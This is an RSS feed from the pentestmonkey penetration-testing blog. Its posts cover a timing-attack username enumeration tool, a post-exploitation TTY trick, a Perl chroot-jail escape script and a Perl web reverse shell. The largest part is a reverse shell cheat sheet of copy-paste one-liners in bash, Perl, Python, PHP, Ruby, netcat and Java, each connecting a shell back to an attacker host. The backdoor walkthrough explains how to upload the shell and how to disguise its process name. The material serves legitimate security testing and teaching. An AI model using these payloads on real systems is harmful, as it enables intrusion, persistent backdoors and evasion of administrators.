<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>perl &#8211; pentestmonkey</title>
	<atom:link href="https://pentestmonkey.net/tag/perl/feed" rel="self" type="application/rss+xml" />
	<link>https://pentestmonkey.net</link>
	<description>Taking the monkey work out of pentesting</description>
	<lastBuildDate>Wed, 25 Jan 2012 21:09:43 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=5.8.3</generator>
	<item>
		<title>timing-attack-checker</title>
		<link>https://pentestmonkey.net/tools/timing-attack-checker</link>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sun, 25 Sep 2011 15:39:22 +0000</pubDate>
				<category><![CDATA[Misc]]></category>
		<category><![CDATA[Tools]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[perl]]></category>
		<category><![CDATA[tool]]></category>
		<category><![CDATA[userenumeration]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=595</guid>

					<description><![CDATA[timing-attack-checker is a simple PERL script that helps you check for timing attacks. The most common form of timing attack I&#8217;ve noticed while pentesting is that the server may take longer to respond to a valid username than to an invalid username.  This can be handy for bruteforcing a list of valid usernames.  I&#8217;ll work [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>timing-attack-checker is a simple PERL script that helps you check for timing attacks.</p>
<p>The most common form of timing attack I&#8217;ve noticed while pentesting is that the server may take longer to respond to a valid username than to an invalid username.  This can be handy for bruteforcing a list of valid usernames.  I&#8217;ll work through an example of such an attack below.</p>
<p>The script could also be used to test other types of timing attack.  It should provide microsecond-resolution timing.</p>
<p>In its simplest form, you give it two commands you want it to record the execution time of.  It will run those commands 100 times (by default), recording how long it takes.</p>
<pre style="font-family: 'Courier 10 Pitch', Courier, monospace; color: #222222; line-height: 21px; font: normal normal normal 12px/18px Consolas, Monaco, monospace; background-image: initial; background-attachment: initial; background-origin: initial; background-clip: initial; background-color: #f7f7f7; margin-bottom: 24px; font-size: 15px; background-position: initial initial; background-repeat: initial initial; padding: 1.5em;">timing-attack-check.pl 'login.pl -u knownuser -p x' 'login.pl -u notexist -p x'</pre>
<p>The data is optionally saved in tab-delimited format for import into a spreadsheet.  Some raw stats are also output to help you decide if you&#8217;ve found a timing attack or not.</p>
<h3>Download</h3>
<p>Get the latest version from <a href="https://github.com/pentestmonkey/timing-attack-checker">github</a></p>
<h3>Usage</h3>
<pre>timing-attack-checker v1.0 http://pentestmonkey.net/tools/timing-attack-checker

Usage: timing-attack-check.pl [ options ] 'cmd1' 'cmd2' ['cmd3' ...]

options are:
  -n N      Number of times to run the commands
  -o file   File to write tab delimited data to

Example:
  timing-attack-check.pl 'login.pl -u knownuser -p x' 'login.pl -u notexist -p x'</pre>
<h3>Dependencies</h3>
<ul>
<li>PERL</li>
<li>Linux (because I use /dev/null for some output)</li>
<li>Time::HiRes module (probably installed by default &#8211; it is on Ubuntu 11.04)</li>
</ul>
<h3>Worked Example</h3>
<p>I set up an SSH server that only allowed logins using keys, not passwords.  I wanted to know if the server would take longer to respond to a login attempt for a valid username than for an invalid username &#8211; presumably it does less work if the username is invalid.  I load an SSH key into my ssh-agent so that the SSH client offers it to the server for each login attempt.</p>
<p>I used the following usernames for testing:</p>
<ul>
<li>&#8220;x&#8221; the name of an account that exists.  It also has an ~/.ssh/authorized_keys file</li>
<li>&#8220;y&#8221; the name of a non-existent account.</li>
<li>&#8220;z&#8221; the name of an account that exists.  It has no ~/.ssh/authorized_keys file</li>
</ul>
<p>I had an ssh-agent running that had one key loaded.  The key was not authorised to log into any account on the target system:</p>
<pre>$ ssh-keygen -f key1
$ eval `ssh-agent`
$ ssh-add key1</pre>
<p>I ran the following command to make 40 login attempts for each:</p>
<pre>$ timing-attack-checker.pl -o data.txt -n 40 'ssh x@host' 'ssh y@host' 'ssh z@host'</pre>
<p>The script output the following:</p>
<pre>[D] Running command: ssh x@host
[D] Command took 0.464256 secs
[D] Running command: ssh y@host
[D] Command took 0.115495 secs
[D] Running command: ssh z@host
[D] Command took 0.128768 secs
[D] Running command: ssh x@host
[D] Command took 0.125885 secs
[D] Running command: ssh y@host
... snip ...
=================================================
Results for: ssh x@host
Average time: 0.143035425
Minimum time: 0.10777
Maximum time: 0.464256
Standard deviation: 0.0608662980593068 (i.e. 68% of times within 1 sd, 95% within 2 sd)
Was fastest on 3 out of 40 occassions (7.5% of the time)
Was slowest on 10 out of 40 occassions (25% of the time)
=================================================
Results for: ssh y@host
Average time: 0.120723175
Minimum time: 0.095311
Maximum time: 0.206071
Standard deviation: 0.0171279751063684 (i.e. 68% of times within 1 sd, 95% within 2 sd)
Was fastest on 36 out of 40 occassions (90% of the time)
Was slowest on 3 out of 40 occassions (7.5% of the time)
=================================================
Results for: ssh z@host
Average time: 0.132942175
Minimum time: 0.114824
Maximum time: 0.154482
Standard deviation: 0.00611497853997666 (i.e. 68% of times within 1 sd, 95% within 2 sd)
Was fastest on 1 out of 40 occassions (2.5% of the time)
Was slowest on 27 out of 40 occassions (67.5% of the time)
=================================================
[+] Saving tab-delimited data to data.txt</pre>
<p>There are a lot of stats there.  Let&#8217;s discuss each in turn an see if it leads us to believe that there&#8217;s a username enumeration issue:</p>
<ul>
<li>Average time: This ranges from about 0.12 secs to 0.14 secs.  That&#8217;s a difference of more than 10%.  It&#8217;s also comparable to a standard deviation (depending which of the 3 you use).  It could be random noise caused by the laggy wireless network I ran it over.  &#8220;x&#8221; looks pretty slow.  &#8220;y&#8221; looks pretty fast.</li>
<li>Min/Max time: The min and max times for each login attempt would ideally be very similar.  We see that for some usernames the max is 2x or 4x higher than the min.  This shows we might have a choppy network connection.  Or maybe the client or server is busy.  This min/max helps to show the consistency (or otherwise) of the data collected.  Our samples aren&#8217;t particularly consistent.</li>
<li><a href="http://en.wikipedia.org/wiki/Standard_deviation">Standard Deviation</a>: How close our samples are to the average.  If themin/max of your sample set are similar and the difference between average login time for &#8220;x&#8221; and &#8220;y&#8221; (say) is more than 2 standard deviations, I think you can be pretty sure you&#8217;ve found a timing attack.  That doesn&#8217;t apply to the data we collected here (more like 1 sd).</li>
<li>Fastest/Slowest: Shows how consistently a command was the fastest/slowest in its round.  This can be useful for busy network/hosts if you can assume that all attempts will be slowed down consistently by network/host problems.  Logins were faster for &#8220;y&#8221; on 90% attempts, compared to the 33% you&#8217;d expect if no timing attack was present.  This seems quite compelling evidence that we can detect accounts that don&#8217;t exist &#8211; remember &#8220;y&#8221; doesn&#8217;t exist.</li>
</ul>
<p>So in conclusion, it seems that it would be possible to bruteforce a list of usernames that exist on the server tested.  If anyone wants to look further into this issue, I&#8217;ve included details on my config at the end of this post.</p>
<p>More generally, you&#8217;ll probably want to run only two commands, not three or more.  The option is there if you need it, though.</p>
<h3>Notes on SSH Server Config</h3>
<p>OS: Ubuntu 11.04</p>
<p>SSH Daemon: OpenSSH_5.8p1 (package: openssh-server 1:5.8p1-1ubuntu3)</p>
<p>Changes to default /etc/ssh/sshd_config:</p>
<pre>PasswordAuthentication no
Port 12345</pre>
<p>CPU: AMD Athlon(tm) 64 X2 Dual Core Processor 5000+</p>
<p>RAM: 2GB</p>
<p>Network: Wireless connection capable of around 3.5 MB/sec</p>
<p>Server was idle during testing.</p>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>Reverse Shell Cheat Sheet</title>
		<link>https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</link>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sun, 04 Sep 2011 15:50:49 +0000</pubDate>
				<category><![CDATA[Shells]]></category>
		<category><![CDATA[bash]]></category>
		<category><![CDATA[cheatsheet]]></category>
		<category><![CDATA[netcat]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[perl]]></category>
		<category><![CDATA[php]]></category>
		<category><![CDATA[python]]></category>
		<category><![CDATA[reverseshell]]></category>
		<category><![CDATA[ruby]]></category>
		<category><![CDATA[xterm]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=175</guid>

					<description><![CDATA[If you&#8217;re lucky enough to find a command execution vulnerability during a penetration test, pretty soon afterwards you&#8217;ll probably want an interactive shell. If it&#8217;s not possible to add a new account / SSH key / .rhosts file and just log in, your next step is likely to be either trowing back a reverse shell or binding [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>If you&#8217;re lucky enough to find a command execution vulnerability during a penetration test, pretty soon afterwards you&#8217;ll probably want an interactive shell.</p>
<p>If it&#8217;s not possible to add a new account / SSH key / .rhosts file and just log in, your next step is likely to be either trowing back a reverse shell or binding a shell to a TCP port.  This page deals with the former.</p>
<p>Your options for creating a reverse shell are limited by the scripting languages installed on the target system &#8211; though you could probably upload a binary program too if you&#8217;re suitably well prepared.</p>
<p>The examples shown are tailored to Unix-like systems.  Some of the examples below should also work on Windows if you use substitute &#8220;/bin/sh -i&#8221; with &#8220;cmd.exe&#8221;.</p>
<p>Each of the methods below is aimed to be a one-liner that you can copy/paste.  As such they&#8217;re quite short lines, but not very readable.</p>
<h3>Bash</h3>
<p>Some versions of <a href="http://www.gnucitizen.org/blog/reverse-shell-with-bash/">bash can send you a reverse shell</a> (this was tested on Ubuntu 10.10):</p>
<pre>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</pre>
<h3>PERL</h3>
<p>Here&#8217;s a shorter, feature-free version of the <a href="http://pentestmonkey.net/tools/web-shells/perl-reverse-shell">perl-reverse-shell</a>:</p>
<pre>perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</pre>
<p>There&#8217;s also an <a href="http://www.plenz.com/reverseshell">alternative PERL revere shell here</a>.</p>
<h3>Python</h3>
<p>This was tested under Linux / Python 2.7:</p>
<pre>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</pre>
<h3>PHP</h3>
<p>This code assumes that the TCP connection uses file descriptor 3.  This worked on my test system.  If it doesn&#8217;t work, try 4, 5, 6&#8230;</p>
<pre>php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</pre>
<p>If you want a .php file to upload, see the more featureful and robust <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a>.</p>
<h3>Ruby</h3>
<pre>ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</pre>
<h3>Netcat</h3>
<p>Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don&#8217;t support the -e option.</p>
<pre>nc -e /bin/sh 10.0.0.1 1234</pre>
<p>If you have the wrong version of netcat installed, <a href="http://www.gnucitizen.org/blog/reverse-shell-with-bash/#comment-127498">Jeff Price points out here</a> that you might still be able to get your reverse shell back like this:</p>
<pre>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</pre>
<h3>Java</h3>
<pre>r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[])
p.waitFor()</pre>
<p>[Untested submission from anonymous reader]</p>
<h3>xterm</h3>
<p>One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port 6001.</p>
<pre>xterm -display 10.0.0.1:1</pre>
<p>To catch the incoming xterm, start an X-Server (:1 &#8211; which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):</p>
<pre>Xnest :1</pre>
<p>You&#8217;ll need to authorise the target to connect to you (command also run on your host):</p>
<pre>xhost +targetip</pre>
<h3>Further Reading</h3>
<p>Also check out <a href="http://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html">Bernardo&#8217;s Reverse Shell One-Liners</a>.  He has some alternative approaches and doesn&#8217;t rely on /bin/sh for his Ruby reverse shell.</p>
<p>There&#8217;s a <a href="http://www.gnucitizen.org/blog/reverse-shell-with-bash/#comment-122387">reverse shell written in gawk over here</a>.  Gawk is not something that I&#8217;ve ever used myself.  However, it seems to get installed by default quite often, so is exactly the sort of language pentesters might want to use for reverse shells.</p>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>Post-Exploitation Without A TTY</title>
		<link>https://pentestmonkey.net/blog/post-exploitation-without-a-tty</link>
					<comments>https://pentestmonkey.net/blog/post-exploitation-without-a-tty#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Wed, 16 Jan 2008 22:08:59 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[expect]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[perl]]></category>
		<category><![CDATA[python]]></category>
		<category><![CDATA[tty]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=35</guid>

					<description><![CDATA[This is a follow-up to a topic I touched on breifly before when I talked about the problem of trying to use the SSH client when you don&#8217;t have a TTY.  I was recently in a position where I got an interactive shell on a box, discovered the root password but was unable to get [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>This is a follow-up to a topic I touched on breifly <a href="http://pentestmonkey.net/blog/ssh-with-no-tty/">before</a> when I talked about the problem of trying to use the SSH client when you don&#8217;t have a TTY.  I was recently in a position where I got an interactive shell on a box, discovered the root password but was unable to get root because I couldn&#8217;t run &#8220;login&#8221; or &#8220;su&#8221;.  Both of these required a TTY in order to work.</p>
<p>I don&#8217;t present a definitive solution in this problem (if you have one please sent it in!).  However I discuss a couple of approaches to getting a TTY&#8230;</p>
<p><span id="more-35"></span></p>
<p>Post-exploitation activities during a pentest may involve using &#8220;su&#8221; to try and log into other local accounts, or using &#8220;ssh&#8221; to log into other hosts.</p>
<h3>Using &#8220;Expect&#8221; To Get A TTY</h3>
<p>If you&#8217;re lucky enough to have the <a href="http://en.wikipedia.org/wiki/Expect">Expect</a> language installed just a few lines of code will get you a good enough TTY to run useful tools such as &#8220;ssh&#8221;, &#8220;su&#8221; and &#8220;login&#8221;.</p>
<pre>$ cat sh.exp
#!/usr/bin/expect
# Spawn a shell, then allow the user to interact with it.
# The new shell will have a good enough TTY to run tools like ssh, su and login
spawn sh
interact</pre>
<p>The following output taken from a <a href="http://pentestmonkey.net/tools/php-reverse-shell/">reverse shell</a> demonstrates how &#8220;su&#8221; doesn&#8217;t work until we use the Expect script:</p>
<pre>$ nc -v -n -l -p 1234
listening on [any] 1234 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 48257
sh: no job control in this shell
sh-3.2$ su -
su: must be run from a terminal
sh-3.2$ expect sh.exp
spawn sh
sh-3.2$ su -
Password:  mypassword
localhost ~ #</pre>
<p>Likewise, the ssh client doesn&#8217;t seem to work properly (with or without the -T option):</p>
<pre>$ nc -v -n -l -p 1234
listening on [any] 1234 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 33250
sh: no job control in this shell
sh-3.2$ ssh localhost
Pseudo-terminal will not be allocated because stdin is not a terminal.
&lt;big pause&gt;</pre>
<pre>$ nc -v -n -l -p 1234
listening on [any] 1234 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 33252
sh: no job control in this shell
sh-3.2$ ssh -T localhost
&lt;big pause&gt;</pre>
<p>After we run sh.exp we are able to use the ssh client as normal:</p>
<pre>$ nc -v -n -l -p 1234
listening on [any] 1234 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 43498
sh: no job control in this shell
sh-3.2$ expect sh.exp
spawn sh
sh-3.2$ ssh localhost
ssh localhost
Password: mypassword
Last login: Wed Jan 16 13:43:20 2008 from 127.0.0.1

user@localhost ~ $</pre>
<h3>Using Python To Get A TTY</h3>
<p>This is quite an elegant solution I found on <a href="http://tero.marttila.de/">Tero&#8217;s glob</a>.  It should be effective against gentoo systems at least because the gentoo package management runs on python.</p>
<p>$ nc -v -n -l -p 1234<br />
listening on [any] 1234 &#8230;<br />
sh: no job control in this shell<br />
sh-3.2$ su &#8211;<br />
su: must be run from a terminal<br />
sh-3.2$ python -c &#8216;import pty; pty.spawn(&#8220;/bin/sh&#8221;)&#8217;<br />
sh-3.2$ su &#8211;<br />
su &#8211;<br />
Password:<br />
localhost ~ #</p>
<h3>Using PERL To Get A TTY</h3>
<p>This is not such as great solution as IO::Pty isn&#8217;t installed by default on any system I&#8217;ve seen.  For completeness, though:</p>
<p>&lt;hmmm&#8230; can&#8217;t get it will working.  Will post later.&gt;</p>
<pre></pre>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/blog/post-exploitation-without-a-tty/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>Scapy in PERL</title>
		<link>https://pentestmonkey.net/blog/scaperl</link>
					<comments>https://pentestmonkey.net/blog/scaperl#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sun, 13 Jan 2008 23:51:21 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[perl]]></category>
		<category><![CDATA[scapy]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=33</guid>

					<description><![CDATA[Scaperl is basically scapy in PERL.  Kinda useful for  PERL-geeks like me who have yet to even write &#8220;Hello World&#8221; in Python.]]></description>
										<content:encoded><![CDATA[<p><a href="http://sylv1.tuxfamily.org/projects/scaperl.html">Scaperl</a> is basically <a href="http://www.secdev.org/projects/scapy/">scapy</a> in PERL.  Kinda useful for  PERL-geeks like me who have yet to even write &#8220;Hello World&#8221; in Python.</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/blog/scaperl/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>Breaking Out of a Chroot Jail Using PERL</title>
		<link>https://pentestmonkey.net/blog/chroot-breakout-perl</link>
					<comments>https://pentestmonkey.net/blog/chroot-breakout-perl#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sun, 09 Dec 2007 20:12:55 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[chroot]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[perl]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=28</guid>

					<description><![CDATA[I had cause to want to break out of a chroot&#8217;d environment recently.  It is well known that if you&#8217;re root within the chroot environment you can break out of it. I set about learning how to break out of chroot and came across an excellent description by Simes from 2002.  It contains a well [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>I had cause to want to break out of a chroot&#8217;d environment recently.  It is well known that if you&#8217;re root within the chroot environment you can break out of it.</p>
<p>I set about learning how to break out of chroot and came across an <a href="http://www.bpfh.net/simes/computing/chroot-break.html">excellent description</a> by Simes from 2002.  It contains a well documented C program that breaks out of the chroot environment.</p>
<p>I wanted to use PERL to break out of the environment, as few chroot environments will contain a C compiler and you may not always be in a position to compile the above program for the OS and Architecture of your jail.</p>
<p><span id="more-28"></span></p>
<h3>Recap: What is Chroot?</h3>
<p>According to <a href="http://en.wikipedia.org/wiki/Chroot">wikipedia:</a></p>
<p><em>A chroot on Unix operating systems is an operation that changes the apparent disk root directory for the current running process and its children. A program that is re-rooted to another directory cannot access or name files outside that directory, called a chroot jail.</em></p>
<p>You&#8217;re likely to come across chroot environments when testing web servers or FTP servers.  Such services are exposed and therefore could be compromised.  If you comrpomise a chroot&#8217;d HTTP or FTP daemon you will only gain access to the limited chroot environment.  You will not be to access the real /etc/passwd for example.  You would only be able to access /some-path-you-dont-even-know-about/etc/passwd.  Your process is trapped inside a directory structure that you can&#8217;t break out of.</p>
<p>&#8230;unless you&#8217;re root.  If you escalate your privileges to root within the jail, it is possible to get out.  Your only obstacle is finding a way to make the &#8220;chroot&#8221; system call with the tools available to you inside the chroot jail &#8211; or uploading your own tools.  Your options include:</p>
<ul>
<li>Compiling a program such as <a href="http://www.bpfh.net/simes/computing/chroot-break.html">this</a> on the target host &#8211; but you probably don&#8217;t have a C compiler in the chroot jail.</li>
<li> Uploading a precompiled chroot-escaper &#8211; if you have one for the target OS/architecture.</li>
<li>Using an installed scripting language (PERL, PHP, Python) &#8211; if there&#8217;s one installed</li>
</ul>
<h3>Overview of Breaking out of Chroot</h3>
<p>The C program referenced about uses this technique:</p>
<ol>
<li>Open a file handle to the root of the jail</li>
<li>Create a sub directory in the jail and chroot yourself there (you are root, so you are allowed to chroot).  You&#8217;re now even deeper in the jail.</li>
<li>Change directory using the file handle to the root of the old jail.  You&#8217;re now outside of the chroot jail you created in the sub directory.  You&#8217;re free!  Well, kind of.  Actually all locations starting with &#8216;/&#8217; are still mapped to that sub directory.  You don&#8217;t want this.</li>
<li>cd ..; cd ..; &#8230;until you reach the real root.</li>
<li>Chroot yourself in the real root.  Now you&#8217;re properly free.</li>
</ol>
<h3>The PERL Script</h3>
<p>Here&#8217;s a simple PERL implementation.  It seems to work on Linux:</p>
<pre>#!/usr/bin/perl -w
use strict;
# unchroot.pl Dec 2007
# http://pentestmonkey.net/blog/chroot-breakout-perl

# This script may be used for legal purposes only.

# Go to the root of the jail
chdir "/";

# Open filehandle to root of jail
opendir JAILROOT, "." or die "ERROR: Couldn't get file handle to root of jailn";

# Create a subdir, move into it
mkdir "mysubdir";
chdir "mysubdir";

# Lock ourselves in a new jail
chroot ".";

# Use our filehandle to get back to the root of the old jail
chdir(*JAILROOT);

# Get to the real root
while ((stat("."))[0] != (stat(".."))[0] or (stat("."))[1] != (stat(".."))[1]) {
        chdir "..";
}

# Lock ourselves in real root - so we're not really in a jail at all now
chroot ".";

# Start an un-jailed shell
system("/bin/sh");</pre>
<h3>So is this a Vulnerability?</h3>
<p>To be clear, this is NOT a vulnerability. The root user is supposed to be able to change the root directory for the current process and for child processes. Chroot only jails non-root processes. Wikipedia clearly summarises the <a href="http://en.wikipedia.org/wiki/Chroot#Limitations">limitations</a> of chroot.</p>
<h3>Feedback</h3>
<p>Thanks to <a href="http://www.nth-dimension.org.uk/">timb</a> for the suggestion to change this:</p>
<pre>foreach my $count (1..100) {
        chdir "..";
}</pre>
<p>To this (which checks if &#8216;.&#8217; and &#8216;..&#8217; are the same thing):</p>
<pre>while ((stat("."))[0] != (stat(".."))[0] or (stat("."))[1] != (stat(".."))[1]) {
        chdir "..";
}</pre>
<p>Much nicer. He even credited his source: &#8220;Solaris Systems Programming&#8221; by Rich Teer.</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/blog/chroot-breakout-perl/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>perl-reverse-shell</title>
		<link>https://pentestmonkey.net/tools/web-shells/perl-reverse-shell</link>
					<comments>https://pentestmonkey.net/tools/web-shells/perl-reverse-shell#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sat, 26 May 2007 16:44:29 +0000</pubDate>
				<category><![CDATA[Web Shells]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[perl]]></category>
		<category><![CDATA[reverseshell]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=110</guid>

					<description><![CDATA[This tool is designed for those situations during a pentest where you have upload access to a webserver that&#8217;s running PERL.  Upload this script to somewhere in the web root then run it by accessing the appropriate URL in your browser.  The script will open an outbound TCP connection from the webserver to a host [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>This tool is designed for those situations during a pentest where you have upload access to a webserver that&#8217;s running PERL.  Upload this script to somewhere in the web root then run it by accessing the appropriate URL in your browser.  The script will open an outbound TCP connection from the webserver to a host and port of your choice.  Bound to this TCP connection will be a shell.</p>
<p>This will be a proper interactive shell in which you can run interective programs like telnet, ssh and su.  It differs from web form-based shell which allow you to send a single command, then return you the output.<br />
<span id="more-110"></span></p>
<h2>Download</h2>
<p><a href="http://pentestmonkey.net/tools/perl-reverse-shell/perl-reverse-shell-1.0.tar.gz">perl-reverse-shell-1.0.tar.gz</a></p>
<p>MD51sum: 1b38db18c1b168573afb8eeabbd8157b<br />
SHA1sum: b2dfefd3d10f5fedd674a8651e5bdcb3b3289335</p>
<h2>Walk Through</h2>
<h3>Modify the source</h3>
<p>To prevent some else from abusing your backdoor &#8211; a nightmare scenario while pentesting &#8211; you need to modify the source code to indicate where you want the reverse shell thrown back to.  Edit the following lines of perl-reverse-shell.pl:</p>
<pre># Where to send the reverse shell.  Change these.</pre>
<pre>my $ip = '127.0.0.1';</pre>
<pre>my $port = 1234;</pre>
<h3>Get Ready to catch the reverse shell</h3>
<p>Start a TCP listener on a host and port that will be accessible by the web server.  Use the same port here as you specified in the script (1234 in this example):</p>
<pre>$ nc -v -n -l -p 1234</pre>
<h3>Upload and Run the script</h3>
<p>Using whatever vulnerability you&#8217;ve discovered in the website, upload perl-reverse-shell.pl.  You&#8217;ll need to place it in a directory where PERL scripts can be run from (e.g. cgi-bin).  Run the script simply by browsing to the newly uploaded file in your web browser:</p>
<pre>http://somesite/cgi-bin/perl-reverse-shell.pl</pre>
<h3>Enjoy your new shell</h3>
<p>If all went well, the web server should have thrown back a shell to your netcat listener.  Some useful commans such as w, uname -a, id and pwd are run automatically for you:</p>
<pre>$ nc -v -n -l -p 1234
listening on [any] 1234 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 58034
 16:35:52 up 39 days, 19:30,  2 users,  load average: 0.22, 0.20, 0.14
USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT
root   :0        19May07 ?xdm?   5:07m  0.01s /bin/sh /usr/kde/3.5/bin/startk
Linux somehost 2.6.19-gentoo-r5 #1 SMP PREEMPT Sun Apr 1 16:49:38 BST 2007 x86_64 AMD Athlon(tm) 64 X2 Dual Core Processor 4200+ AuthenticAMD GNU/Linux
uid=81(apache) gid=81(apache) groups=81(apache)
/
apache@somehost / $</pre>
<h2>FAQs</h2>
<h3>When is this useful?</h3>
<p>Perhaps the only areas on disk that you have write access to are mounted with the &#8220;noexec&#8221; option.  Uploading a compiled program will be of no use in these situations.  You need to use an installed scripting language like Python, PERL, PHP, etc.<br />
Perhaps you just can&#8217;t be bothered to upload a second program.</p>
<h3>Isn&#8217;t the shell connection just going to be severed when the web server times out the PERL script?</h3>
<p>No.  It doesn&#8217;t seem to on the systems that I&#8217;ve tested it on (Gentoo Linux only so far).  Additionally the PERL script attempts to daemonise itself and dissociate from the parent process to avoid this.</p>
<h3>Isn&#8217;t there going to be a rather suspicious looking shell process when the admin runs &#8220;ps&#8221;?</h3>
<p>Kinda.  The number of processes has been minimised by using &#8220;exec&#8221; instead of &#8220;system&#8221;.  The &#8220;/bin/sh -i&#8221; process will be seen in the process listing but can be renamed.  By default /bin/sh will be renamed to /usr/sbin/apache, so the process listing looks like</p>
<pre>apache    5289  0.0  0.0   2840  1464 ?        Ss   15:31   0:00 /usr/sbin/apache -i</pre>
<h2>Caveats</h2>
<p>Outbound firewalling (aka egress filtering) may prevent your reverse shell connection reaching you.  Pick a port that&#8217;s allowed through Firewall.  If there are none, you&#8217;ll have to make do with a form-based PHP shell.</p>
<p>This particular implementation of the reverse shell is unix-based.  You&#8217;ll need to modify it before it will work on windows.</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/tools/web-shells/perl-reverse-shell/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
	</channel>
</rss>
